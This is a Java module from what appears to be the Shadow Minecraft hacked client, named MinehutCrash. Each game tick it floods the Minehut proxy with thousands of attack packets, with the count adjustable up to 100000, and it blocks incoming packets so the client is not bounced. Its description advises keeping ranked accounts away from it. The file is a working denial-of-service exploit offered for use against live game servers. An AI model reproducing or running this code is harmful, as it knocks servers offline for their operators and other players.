/*
 * Copyright (c) Shadow client, Saturn5VFive and contributors 2022. All rights reserved.
 */

package net.shadow.client.feature.module.impl.crash;

import net.minecraft.client.util.math.MatrixStack;
import net.minecraft.network.packet.c2s.play.PlayerInteractEntityC2SPacket;
import net.shadow.client.feature.config.BooleanSetting;
import net.shadow.client.feature.config.DoubleSetting;
import net.shadow.client.feature.module.Module;
import net.shadow.client.feature.module.ModuleType;
import net.shadow.client.helper.event.EventListener;
import net.shadow.client.helper.event.EventType;
import net.shadow.client.helper.event.events.PacketEvent;

public class MinehutCrash extends Module {

    final DoubleSetting ds = this.config.create(new DoubleSetting.Builder(5000).min(2000).max(100000).name("Power").description("Power to blast the bungee with").get());
    final BooleanSetting bb = this.config.create(new BooleanSetting.Builder(true).name("Bounces").description("Prevent bungee bounces client side").get());

    public MinehutCrash() {
        super("MinehutCrash", "Minehut crash exploit WTF how??? (do not use this with a rank account)", ModuleType.CRASH);
    }

    @EventListener(type = EventType.PACKET_RECEIVE)
    void blockBounces(PacketEvent event) {
        if (this.isEnabled() && this.bb.getValue()) event.setCancelled(true);
    }

    @Override
    public void tick() {
        for (int i = 0; i < ds.getValue(); i++) {
            client.player.networkHandler.sendPacket(PlayerInteractEntityC2SPacket.attack(client.player, false)); //bungee blaster!!!
        }
    }

    @Override
    public void enable() {
    }

    @Override
    public void disable() {
    }

    @Override
    public String getContext() {
        return null;
    }

    @Override
    public void onWorldRender(MatrixStack matrices) {

    }

    @Override
    public void onHudRender() {

    }

}
